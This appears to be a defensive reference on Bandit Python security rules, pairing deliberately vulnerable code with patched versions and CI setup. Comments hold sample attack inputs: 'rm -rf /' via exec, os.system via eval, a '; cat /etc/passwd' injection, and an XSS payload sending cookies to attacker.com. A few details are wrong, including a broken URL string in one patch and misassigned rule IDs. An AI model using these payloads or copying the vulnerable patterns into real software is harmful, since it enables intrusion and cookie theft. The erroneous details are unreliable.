---
title: "Bandit Python Security Rules and Vulnerability Reference"
category: "sast_rules"
language: "python"
version: "Bandit 1.7.x"
---

# Bandit Python Security Rules --- Detailed RAG Knowledge Base (Part 1)

**Primary official sources:** Bandit Documentation and Python Security Standards
> Bandit ReadTheDocs Official Catalog: https://bandit.readthedocs.io/en/latest/
> Official Python Security Warnings: https://docs.python.org/3/library/security_warnings.html
> CWE (Common Weakness Enumeration): https://cwe.mitre.org/
> OWASP Top 10 Python Security Guidelines: https://owasp.org/www-project-top-ten/

This document constitutes Part 1 of a structured Python security static analysis reference.
It organizes Bandit `Bxxx` rule definitions, explaining security anti-patterns and secure code remediations.

--------------------------------------------------------------------------------

# 1. Introduction to Bandit and Python AST Security Parsing

Bandit is a static analysis tool designed to find common security issues in Python source code.
Bandit processes Python files by building an Abstract Syntax Tree (AST), instantiating 
plugins that traverse the AST nodes, and generating security reports detailing confidence 
and severity ratings.

Integrating Bandit into continuous integration (CI) pipelines helps catch injection flaws,
insecure cryptographic implementations, and configuration oversights before code reaches production.

# 2. B1xx: Assertions and Dangerous Built-ins

The B1xx rule family inspects built-in functions and syntactic constructs that are frequently
misused or introduce architectural vulnerabilities in production environments.

## 2.1. B101 (assert_used)

### 2.1.1. Rule Definition and Architectural Impact
Bandit flags `B101` when an `assert` statement is detected in Python source code.
In Python, assertions are primarily intended for debugging and internal invariant testing.
When Python is invoked with optimization flags (`python -O` or the `PYTHONOPTIMIZE` environment variable),
the bytecode compiler completely strips out all `assert` statements for performance.

Relying on `assert` statements for security checks, parameter validation, or access control
is a severe vulnerability because attackers can run the application in optimized mode,
bypassing all security validations instantly.

### 2.1.2. Vulnerable Code Example
```python
def authorize_admin_action(user_role: str, payload: dict) -> dict:
    # Vulnerability: Using assert for security authorization.
    # If run with python -O, this check is entirely deleted by the interpreter.
    assert user_role == "ADMIN", "Unauthorized user access attempt."
    
    # Execute sensitive administrative action
    return {"status": "success", "executed_action": payload.get("command")}
```

### 2.1.3. Patched Solution
Replace assert statements with standard explicit conditional checks and raise appropriate
built-in exceptions (PermissionError, ValueError) that persist regardless of optimization flags.

```python
def authorize_admin_action(user_role: str, payload: dict) -> dict:
    # Patched: Explicit condition raises an un-strippable exception.
    if user_role != "ADMIN":
        raise PermissionError("Unauthorized user access attempt.")
    
    return {"status": "success", "executed_action": payload.get("command")}
```

## 2.2. B102 (exec_used)

### 2.2.1. Rule Definition
Bandit raises B102 when the built-in exec() function is detected.
The exec() function dynamically executes arbitrary Python code strings passed as arguments.
If any part of the executed string is influenced by untrusted user input, it results in
immediate Arbitrary Code Execution (Remote Code Execution - RCE).

### 2.2.2. Vulnerable Code Example
```python
from flask import request, jsonify

@app.route('/api/evaluate_script', methods=['POST'])
def evaluate_script():
    data = request.json
    user_code = data.get('code_snippet', '')
    
    # Vulnerability: Blindly executing arbitrary strings provided by the user.
    # An attacker can pass: "import os; os.system('rm -rf /')"
    exec(user_code)
    return jsonify({"status": "executed"})
```

### 2.2.3. Patched Solution
Avoid dynamic code execution entirely. Use static dispatch logic or safe expression parsers
if dynamic evaluation is strictly mandatory.

```python
from flask import request, jsonify

# Patched: Use an explicit allowlist of pre-approved safe functions
SAFE_OPERATIONS = {
    "square": lambda x: x ** 2,
    "cube": lambda x: x ** 3,
}

@app.route('/api/evaluate_script', methods=['POST'])
def evaluate_script():
    data = request.json
    operation = data.get('operation')
    value = data.get('value', 0)
    
    if operation not in SAFE_OPERATIONS:
        return jsonify({"error": "Disallowed operation"}), 400
        
    result = SAFE_OPERATIONS[operation](value)
    return jsonify({"status": "success", "result": result})
```

## 2.3. B103 (set_bad_file_permissions)

### 2.3.1. Rule Definition
Bandit triggers B103 when functions like os.chmod() are invoked with overly permissive
file permissions (such as 0o777 or world-writable bits). This allows any local user
on the host system to read, modify, or replace critical configuration files and sensitive data.

### 2.3.2. Vulnerable Code Example
```python
import os

def create_secure_temp_file(filepath: str, content: str):
    with open(filepath, 'w') as f:
        f.write(content)
        
    # Vulnerability: Setting world-writable permissions (0o777) exposes the file.
    os.chmod(filepath, 0o777)
```

### 2.3.3. Patched Solution
Enforce strict file permissions restricted to the file owner (0o600 for private files
or 0o700 for private directories).

```python
import os

def create_secure_temp_file(filepath: str, content: str):
    # Set restrictive umask before creation
    old_umask = os.umask(0o077)
    try:
        with open(filepath, 'w') as f:
            f.write(content)
            
        # Patched: Restrict permissions strictly to the owner (Read/Write only)
        os.chmod(filepath, 0o600)
    finally:
        os.umask(old_umask)
```

# 3. B3xx: Blacklisted Functions and Cryptographic Warnings
The B3xx rule family identifies function calls that are known to be cryptographically broken,
deprecated, or inherently dangerous in security contexts.

## 3.1. B301 (pickle_used)

### 3.1.1. Rule Definition
Bandit issues B301 when the pickle, cPickle, shelve, or xmlrpc modules are imported or utilized.
Python's pickle serialization module is not secure. Deserializing pickled data executes arbitrary
bytecode embedded in the stream, making it mathematically equivalent to calling exec().
An attacker supplying malicious serialized payloads can achieve instant Remote Code Execution.

### 3.1.2. Vulnerable Code Example
```python
import pickle
from flask import request, Response

@app.route('/api/load_session_state', methods=['POST'])
def load_session_state():
    raw_payload = request.data
    
    # Vulnerability: Unpickling untrusted network bytes allows arbitrary code execution.
    session_data = pickle.loads(raw_payload)
    return Response(f"Welcome back {session_data.get('username')}", status=200)
```

### 3.1.3. Patched Solution
Never deserialize pickle data across trust boundaries. Use safe data exchange formats such as JSON.

```python
import json
from flask import request, jsonify

@app.route('/api/load_session_state', methods=['POST'])
def load_session_state():
    try:
        # Patched: JSON only parses primitive data types, preventing code execution.
        session_data = json.loads(request.data.decode('utf-8'))
        return jsonify({"status": "success", "username": session_data.get("username")})
    except (json.JSONDecodeError, UnicodeDecodeError):
        return jsonify({"error": "Invalid payload format"}), 400
```

## 3.2. B303 (md5_used) and Weak Hashing

### 3.2.1. Rule Definition
Bandit flags B303 when cryptographic libraries are initialized using weak hash algorithms
such as MD5, SHA1, RIPEMD160, or Whirlpool. These algorithms suffer from collision vulnerabilities
and must never be used for digital signatures, data integrity verification, or credential storage.

### 3.2.2. Vulnerable Code Example
```python
import hashlib

def generate_file_checksum(file_bytes: bytes) -> str:
    # Vulnerability: MD5 is vulnerable to hash collision attacks.
    hasher = hashlib.md5()
    hasher.update(file_bytes)
    return hasher.hexdigest()
```

### 3.2.3. Patched Solution
Upgrade to cryptographically robust hash functions such as SHA-256 or SHA-512.

```python
import hashlib

def generate_file_checksum(file_bytes: bytes) -> str:
    # Patched: SHA-256 provides strong cryptographic integrity protection.
    hasher = hashlib.sha256()
    hasher.update(file_bytes)
    return hasher.hexdigest()
```

## 3.3. B307 (eval_used)

### 3.3.1. Rule Definition
Bandit triggers B307 when the built-in eval() function is invoked.
The eval() function parses and evaluates expression strings as Python code.
If untrusted user input flows into eval(), it permits arbitrary expression execution,
leading to immediate security bypasses and Remote Code Execution.

### 3.3.2. Vulnerable Code Example
```python
from flask import request, jsonify

@app.route('/api/calculate', methods=['POST'])
def calculate_expression():
    expression = request.json.get('expr', '0')
    
    # Vulnerability: Evaluating user-supplied mathematical strings using eval().
    # An attacker can pass: "__import__('os').system('id')"
    result = eval(expression)
    return jsonify({"result": result})
```

### 3.3.3. Patched Solution
Never pass untrusted strings to eval(). Use dedicated safe mathematical parsing libraries
or implement custom restricted AST expression evaluators.

```python
import ast
from flask import request, jsonify

# Whitelist of safe mathematical operators supported by ast.literal_eval
ALLOWED_OPERATORS = {
    ast.Add: lambda a, b: a + b,
    ast.Sub: lambda a, b: a - b,
    ast.Mult: lambda a, b: a * b,
    ast.Div: lambda a, b: a / b,
}

def safe_eval(node):
    if isinstance(node, ast.Constant): # Numeric literals
        return node.value
    elif isinstance(node, ast.BinOp): # Binary operations (+, -, *, /)
        op_type = type(node.op)
        if op_type in ALLOWED_OPERATORS:
            left = safe_eval(node.left)
            right = safe_eval(node.right)
            return ALLOWED_OPERATORS[op_type](left, right)
    raise ValueError("Unsupported or unsafe expression")

@app.route('/api/calculate', methods=['POST'])
def calculate_expression():
    expr_str = request.json.get('expr', '0')
    try:
        # Patched: Parse expression safely using AST without execution capabilities
        node = ast.parse(expr_str, mode='eval').body
        result = safe_eval(node)
        return jsonify({"result": result})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 400
```

# 5. B6xx: Shell Injections and Subprocess Risks

The B6xx rule family flags subprocess invocations and operating system command executions 
that are vulnerable to command injection. When user input is concatenated into shell commands, 
attackers can execute arbitrary operating system commands with the privileges of the web application.

## 5.1. B602 (subprocess_popen_with_shell_equals_true)

### 5.1.1. Rule Definition and Architectural Impact
Bandit triggers `B602` when `subprocess.Popen`, `subprocess.run()`, or related functions 
are invoked with `shell=True`. 
When `shell=True` is specified, Python executes the command string through the underlying system shell 
(such as `/bin/sh` on Unix or `cmd.exe` on Windows). If any part of the command string 
includes untrusted user input, the shell processes metacharacters (like `;`, `&`, `|`, and `>`), 
enabling attackers to chain arbitrary system commands.

### 5.1.2. Vulnerable Code Example
```python
import subprocess
from flask import request, jsonify

@app.route('/api/ping', methods=['POST'])
def ping_host():
    target_host = request.json.get('host', '127.0.0.1')
    
    # Vulnerability: shell=True combined with string formatting allows command injection.
    # An attacker can supply: "127.0.0.1; cat /etc/passwd"
    command = f"ping -c 1 {target_host}"
    
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return jsonify({"output": output})
    except subprocess.CalledProcessError as e:
        return jsonify({"error": e.output}), 500
```

### 5.1.3. Patched Solution
Set shell=False (the default) and pass arguments as a list of individual strings.
This prevents the shell from interpreting metacharacters entirely.

```python
import subprocess
from flask import request, jsonify
import ipaddress

@app.route('/api/ping', methods=['POST'])
def ping_host():
    target_host = request.json.get('host', '127.0.0.1')
    
    # Patched: Validate that the input is a valid IP address or strict hostname
    try:
        ipaddress.ip_address(target_host)
    except ValueError:
        return jsonify({"error": "Invalid IP address format provided."}), 400
        
    # Patched: shell=False with argument list prevents command injection
    command_args = ["ping", "-c", "1", target_host]
    
    try:
        output = subprocess.check_output(command_args, shell=False, stderr=subprocess.STDOUT, text=True, timeout=5)
        return jsonify({"output": output})
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        return jsonify({"error": "Execution failed or timed out."}), 500
```

## 5.2. B603 (subprocess_without_shell_equals_true)

### 5.2.1. Rule Definition
Bandit raises B603 when subprocess functions are called without shell execution (shell=False),
but the command argument is passed as a single concatenated string rather than a list of arguments,
or when the executable path is derived from untrusted user input.

### 5.2.2. Vulnerable Code Example
```python
import subprocess
from flask import request, jsonify

@app.route('/api/convert', methods=['POST'])
def convert_file():
    user_filename = request.json.get('filename')
    
    # Vulnerability: Passing a single string with shell=False can cause argument injection
    # if the underlying tool interprets flags passed inside the filename string.
    cmd = f"convert_tool --input {user_filename} --output out.pdf"
    
    # Bandit flags B603 because the input string is not securely segregated into an argument list
    output = subprocess.run(cmd.split(), capture_output=True, text=True)
    return jsonify({"stdout": output.stdout})
```

### 5.2.3. Patched Solution
Pass arguments strictly as a list and validate file paths against allowlists or regex constraints.

```python
import subprocess
from flask import request, jsonify
import re

@app.route('/api/convert', methods=['POST'])
def convert_file():
    user_filename = request.json.get('filename', '')
    
    # Patched: Strict allowlist validation on filenames (alphanumeric and underscores only)
    if not re.match(r"^[a-zA-Z0-9_-]+\.txt$", user_filename):
        return jsonify({"error": "Invalid filename format."}), 400
        
    # Patched: Explicit argument list prevents flag injection
    command_args = ["convert_tool", "--input", user_filename, "--output", "out.pdf"]
    
    output = subprocess.run(command_args, shell=False, capture_output=True, text=True, timeout=10)
    return jsonify({"stdout": output.stdout})
```

# 6. B4xx: Import Blacklists and Dangerous Modules
The B4xx rule family warns developers when modules known to present security risks
or facilitate exploitation are imported into the codebase.

## 6.1. B403 (import_pickle) and Dangerous Serializers

### 6.1.1. Rule Definition
Bandit issues B403 whenever modules such as pickle, cPickle, shelve, xmlrpc,
or subprocess are imported. While importing these modules is not automatically a vulnerability,
it signals to static analysis auditors that the module is present and requires strict
validation whenever unverified data is handled.

### 6.1.2. Vulnerable Import Pattern
```python
# Bandit B403 triggers here, alerting reviewers that pickle is present in the namespace
import pickle
import os

def restore_user_session(encoded_cookie: str) -> dict:
    import base64
    # Vulnerability: Using pickle on unverified cookie data
    return pickle.loads(base64.b64decode(encoded_cookie))
```

### 6.1.3. Patched Solution
Remove dangerous imports entirely and use safe serializers like json or itsdangerous.

```python
import json
import itsdangerous
from flask import current_app

def restore_user_session(signed_cookie: str) -> dict:
    # Patched: Use cryptographically signed tokens via itsdangerous instead of pickle
    signer = itsdangerous.Signer(current_app.config['SECRET_KEY'])
    try:
        unsigned_data = signer.unsign(signed_cookie)
        return json.loads(unsigned_data.decode('utf-8'))
    except itsdangerous.BadSignature:
        raise PermissionError("Invalid session signature.")
```

## 6.2. B404 (import_subprocess)

### 6.2.1. Rule Definition
Bandit triggers B404 when subprocess is imported. It flags potential process execution
risks that must be audited to ensure user input never reaches system calls.

# 7. B7xx: SQL Injection and Template Injections (SSTI)
The B7xx rule family identifies flaws where untrusted inputs are concatenated directly into
database queries or evaluation templates.

## 7.1. B608 (hardcoded_sql_expressions / SQL Injection via String Formatting)

### 7.1.1. Rule Definition
Bandit issues B608 when SQL queries are constructed using Python string formatting
(f-strings, % formatting, or .format()) instead of parameterized queries.

### 7.1.2. Vulnerable Code Example
```python
import sqlite3
from flask import request, jsonify

@app.route('/api/user_search', methods=['GET'])
def search_user():
    email = request.args.get('email', '')
    
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Vulnerability: SQL injection via f-string formatting
    query = f"SELECT id, username, role FROM users WHERE email = '{email}'"
    cursor.execute(query)
    
    results = cursor.fetchall()
    conn.close()
    return jsonify({"users": results})
```

### 7.1.3. Patched Solution
Use parameterized queries (? or %s depending on the database driver).

```python
import sqlite3
from flask import request, jsonify

@app.route('/api/user_search', methods=['GET'])
def search_user():
    email = request.args.get('email', '')
    
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Patched: Parameterized query prevents SQL injection entirely
    query = "SELECT id, username, role FROM users WHERE email = ?"
    cursor.execute(query, (email,))
    
    results = cursor.fetchall()
    conn.close()
    return jsonify({"users": results})
```

## 7.2. B701 (jinja2_autoescape_false)

### 7.2.1. Rule Definition
Bandit triggers B701 when Jinja2 environment configurations are initialized with
autoescape=False. Disabling autoescaping in web template engines leaves the application
wide open to Reflected and Stored Cross-Site Scripting (XSS) attacks.

### 7.2.2. Vulnerable Code Example
```python
from jinja2 import Environment, FileSystemLoader

# Vulnerability: autoescape is explicitly set to False
env = Environment(
    loader=FileSystemLoader('templates'),
    autoescape=False
)

def render_profile(username: str):
    template = env.get_template('profile.html')
    # If username contains '<script>alert(1)</script>', it will execute in the victim's browser
    return template.render(user=username)
```

### 7.2.3. Patched Solution
Always enforce autoescape=True on Jinja2 environments to automatically sanitize HTML output.

```python
from jinja2 import Environment, FileSystemLoader, select_autoescape

# Patched: autoescape enabled with select_autoescape for HTML and XML templates
env = Environment(
    loader=FileSystemLoader('templates'),
    autoescape=select_autoescape(['html', 'xml'])
)

def render_profile(username: str):
    template = env.get_template('profile.html')
    # Jinja2 automatically encodes special characters into HTML entities
    return template.render(user=username)
```

## 7.3. B703 (django_mark_safe)

### 7.3.1. Rule Definition
Bandit triggers B703 when Django's mark_safe() or safestring.mark_safe function is used.
mark_safe() tells the Django template engine that a string contains safe HTML and should
not be automatically escaped. If untrusted user input is passed into mark_safe(),
it immediately disables Django's built-in XSS protection, allowing arbitrary script execution.

### 7.3.2. Vulnerable Code Example
```python
from django.utils.safestring import mark_safe
from django.http import HttpResponse

def render_user_bio(request):
    bio_content = request.GET.get('bio', '')
    
    # Vulnerability: Marking untrusted user input as safe HTML bypasses escaping.
    # An attacker can pass: "<script>fetch('http://attacker.com/?cookie=' + document.cookie)</script>"
    safe_bio = mark_safe(bio_content)
    return HttpResponse(f"<div>User Bio: {safe_bio}</div>")
```

### 7.3.3. Patched Solution
Never pass raw user input to mark_safe(). If rich HTML formatting is required,
sanitize the input using a robust HTML sanitizer library like bleach before marking it safe.

```python
import bleach
from django.utils.safestring import mark_safe
from django.http import HttpResponse

# Allowed tags and attributes for rich text bios
ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong', 'p']
ALLOWED_ATTRIBUTES = {}

def render_user_bio(request):
    raw_bio = request.GET.get('bio', '')
    
    # Patched: Sanitize untrusted input first using bleach to remove malicious scripts
    cleaned_bio = bleach.clean(raw_bio, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, strip=True)
    
    # Safe to render after explicit sanitization
    safe_bio = mark_safe(cleaned_bio)
    return HttpResponse(f"<div>User Bio: {safe_bio}</div>")
```

# 9. B5xx: Cryptography and SSL/TLS Configuration Flaws

The B5xx rule family identifies insecure cryptographic configurations, such as disabled 
certificate validations, obsolete TLS versions, and weak cryptographic padding schemes.

## 9.1. B501 (request_with_no_cert_validation)

### 9.1.1. Rule Definition and Architectural Impact
Bandit flags `B501` when HTTP requests via `requests.get()`, `requests.post()`, or `urllib` 
are executed with `verify=False`. 
Disabling SSL certificate verification disables TLS handshake checks entirely. 
This exposes the application to active Man-in-the-Middle (MitM) attacks, allowing malicious 
network operators to intercept, read, and tamper with encrypted traffic.

### 9.1.2. Vulnerable Code Example
```python
import requests
from flask import jsonify

def fetch_external_partner_data():
    # Vulnerability: verify=False disables SSL/TLS certificate verification.
    # An attacker on the local network can spoof the partner endpoint easily.
    response = requests.get("https://partner.internal-api.com/v1/records", verify=False, timeout=10)
    return jsonify(response.json())
```

### 9.1.3. Patched Solution
Always enforce certificate validation (verify=True, which is the default) or supply
the absolute file path to a trusted internal enterprise Certificate Authority (CA) bundle.

```python
import requests
from flask import jsonify

def fetch_external_partner_data():
    # Patched: Enforce strict certificate verification using an explicit CA bundle path
    ca_bundle_path = "/etc/ssl/certs/enterprise_ca_bundle.pem"
    
    response = requests.get(
        "[https://partner.internal-api.com/v1/records](https://partner.internal-api.com/v1/records)", 
        verify=ca_bundle_path, 
        timeout=10
    )
    return jsonify(response.json())
```

## 9.2. B506 (yaml_load) and Insecure YAML Deserialization

### 9.2.1. Rule Definition
Bandit issues B506 when yaml.load() is invoked without specifying a safe loader
(such as Loader=yaml.SafeLoader).
Standard yaml.load() in PyYAML prior to version 5.1 instantiates arbitrary Python
classes defined within the YAML stream, leading to instant Remote Code Execution (RCE).

### 9.2.2. Vulnerable Code Example
```python
import yaml
from flask import request, jsonify

@app.route('/api/parse_config', methods=['POST'])
def parse_config():
    yaml_content = request.data
    
    # Vulnerability: yaml.load() without SafeLoader permits arbitrary object instantiation.
    # Malicious YAML payloads can execute OS commands on parse.
    parsed_data = yaml.load(yaml_content)
    return jsonify({"status": "parsed", "data": parsed_data})
```

### 9.2.3. Patched Solution
Always use yaml.safe_load() or explicitly pass Loader=yaml.SafeLoader to restrict
deserialization strictly to standard scalar types (strings, ints, lists, dicts).

```python
import yaml
from flask import request, jsonify

@app.route('/api/parse_config', methods=['POST'])
def parse_config():
    yaml_content = request.data
    
    try:
        # Patched: yaml.safe_load restricts parser capabilities, preventing arbitrary code execution.
        parsed_data = yaml.safe_load(yaml_content)
        return jsonify({"status": "parsed", "data": parsed_data})
    except yaml.YAMLError as exc:
        return jsonify({"error": f"Invalid YAML structure: {exc}"}), 400
```

# 10. Bandit Configuration and False Positive Management
In large enterprise codebases, static analysis tools occasionally raise false positives.
Bandit supports configuration files (.bandit) and inline source code annotations
to manage and suppress specific rule violations responsibly.

## 10.1. Inline Suppression Comments (# nosec)
When a specific line triggers a Bandit warning that has been manually reviewed and verified
as secure within its local context, developers can append # nosec to suppress the finding.

```python
import subprocess

def run_trusted_diagnostic_tool():
    # Suppress B603/B607 because the executable path is hardcoded and immutable
    cmd = ["/usr/bin/internal_diag", "--check-health"]
    output = subprocess.run(cmd, capture_output=True, text=True) # nosec B603
    return output.stdout
```

## 10.2. Baseline Configuration (.bandit)
Teams can configure global scan parameters, select specific test IDs to include or exclude,
and define severity thresholds using a root-level .bandit configuration file.

```ini
[bandit]
# Exclude test directories and virtual environments from security scanning
exclude_dirs = ["tests", "venv", ".git", "build", "dist"]

# Limit scans to specific severity or confidence levels (LOW, MEDIUM, HIGH)
severity = medium
confidence = medium

# Disable specific rules globally if they conflict with architectural standards
skips = ["B104"]
```

# 11. CI/CD Pipeline Integration Strategies
To ensure security vulnerabilities are caught before reaching production branches, Bandit
must be integrated into automated continuous integration workflows.

## 11.1. GitHub Actions Integration
Below is a production-grade GitHub Actions workflow that executes Bandit on every push
and pull request, failing the build if high-severity vulnerabilities are discovered.

```yaml
name: Bandit Security Scan

on:
  push:
    branches: [ "main", "develop" ]
  pull_request:
    branches: [ "main" ]

jobs:
  bandit-security-audit:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout Source Code
      uses: actions/checkout@v3

    - name: Set up Python 3.10
      uses: actions/setup-python@v3
      with:
        python-version: "3.10"

    - name: Install Dependencies
      run: |
        python -m pip install --upgrade pip
        pip install bandit

    - name: Run Bandit Security Scanner
      run: |
        # Execute bandit across the source directory, failing on high severity issues
        bandit -r src/ -ii -ll --format custom --output bandit_report.txt || true
        
        # Run strict check failing the build on medium/high findings
        bandit -r src/ -lll -iii
```

## 11.2. GitLab CI/CD Integration
For teams utilizing GitLab, the following .gitlab-ci.yml configuration integrates Bandit
into the security validation stage.

```yaml
stages:
  - security_lint

bandit_scan:
  stage: security_lint
  image: python:3.10
  before_script:
    - pip install bandit
  script:
    - bandit -r src/ -f json -o bandit-report.json
  artifacts:
    when: always
    reports:
      container_scanning: bandit-report.json
    expire_in: 30 days
  allow_failure: false
```

# 12. Conclusion and Holistic Python Security
Static analysis tools like Bandit serve as an indispensable first line of defense in the
Python security ecosystem. By inspecting Abstract Syntax Trees for dangerous built-ins,
un-sanitized subprocess calls, weak cryptographic primitives, and unsafe deserialization mechanisms,
development teams can systematically eliminate entire classes of vulnerabilities.

When combined with Retrieval-Augmented Generation (RAG) pipelines and LLM-powered code reviewers,
engineers receive immediate, contextual remediation guidance directly inside their IDEs and Pull Requests,
drastically elevating the security posture of enterprise applications.

# 13. Additional Python Security Best Practices
Beyond static analysis with Bandit, securing enterprise Python applications requires adherence
to defense-in-depth principles across all application tiers.

## 13.1. Managing Secrets and Environment Variables
Hardcoding database credentials, API keys, or JSON Web Token (JWT) secrets directly into
source code is a catastrophic security anti-pattern (frequently tracked under Bandit B105/B106).
All sensitive configuration variables must be injected strictly via runtime environment
variables or secure secret managers (e.g., AWS Secrets Manager, HashiCorp Vault).

### 13.1.1. Vulnerable Code Example
```python
# Vulnerability: Hardcoded database password in source code
DATABASE_CONFIG = {
    "host": "db.internal.net",
    "user": "admin",
    "password": "SuperSecretPassword123!", # Hardcoded secret
    "database": "production_db"
}
```

### 13.1.2. Patched Solution
Load secrets dynamically using os.environ combined with validation checks.

```python
import os

# Patched: Retrieve secrets securely from runtime environment variables
DATABASE_CONFIG = {
    "host": os.environ.get("DB_HOST", "localhost"),
    "user": os.environ.get("DB_USER", "app_user"),
    "password": os.environ.get("DB_PASSWORD"), # Loaded dynamically
    "database": os.environ.get("DB_NAME", "main_db")
}

if not DATABASE_CONFIG["password"]:
    raise RuntimeError("CRITICAL: DB_PASSWORD environment variable is missing.")
```

## 13.2. Dependency Vulnerability Scanning
Static analysis of source code does not inspect third-party package dependencies listed in
requirements.txt or pyproject.toml. Vulnerabilities in third-party libraries (e.g., outdated
versions of requests, Django, or Flask) can lead to remote compromise.
Teams must integrate software composition analysis (SCA) tools such as pip-audit or safety
into their CI/CD pipelines alongside Bandit.

```bash
# Example SCA scan command for CI/CD pipelines
pip-audit --requirement requirements.txt --strict
```
Regularly auditing both source code via Bandit and third-party packages via pip-audit
ensures a robust, enterprise-grade software supply chain security posture.

Maintaining strict adherence to these guidelines prevents zero-day exploits and ensures
long-term compliance with industry security frameworks such as OWASP ASVS and NIST.

Automated scanners and RAG-augmented assistants work in synergy to keep development teams
informed of evolving threat vectors and secure coding standards.

Engineers should review all automated security alerts promptly and apply recommended
patches before code promotion.

Continuous vigilance is the cornerstone of modern application security.